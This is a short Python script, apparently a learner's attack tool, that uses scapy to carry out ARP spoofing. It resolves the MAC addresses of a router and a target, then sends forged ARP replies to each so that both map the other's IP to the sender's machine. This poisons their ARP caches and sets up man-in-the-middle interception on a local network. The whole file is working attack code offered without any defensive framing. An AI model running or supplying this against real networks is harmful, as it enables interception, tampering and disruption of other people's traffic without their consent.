import scapy.all as scapy
import optparse


def get_arguments():

    parser = optparse.OptionParser()
    parser.add_option("-r", "--route", dest="route_ip", help="router ip address")
    parser.add_option("-t", "--target", dest="target_ip", help="target ip address")
    (options, arguments) = parser.parse_args()

    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answeres_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    mac = answeres_list[0][1].hwsrc

    return mac


def packets_create(options) -> list:
    route_ip = options.route_ip
    target_ip = options.target_ip
    route_mac = get_mac(route_ip)
    target_mac = get_mac(target_ip)

    target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=route_ip)
    route_packet = scapy.ARP(op=2, pdst=route_ip, hwdst=route_mac, psrc=target_ip)

    packets_list = [target_packet, route_packet]

    return packets_list


def packets_send(packets: list):
    print("[+] Sending packets")
    for packet in packets:
        scapy.send(packet)
    print(".")
    print("[+] Packets sent ")


if __name__ == "__main__":
    options = get_arguments()
    packets_list = packets_create(options)
    packets_send(packets_list)
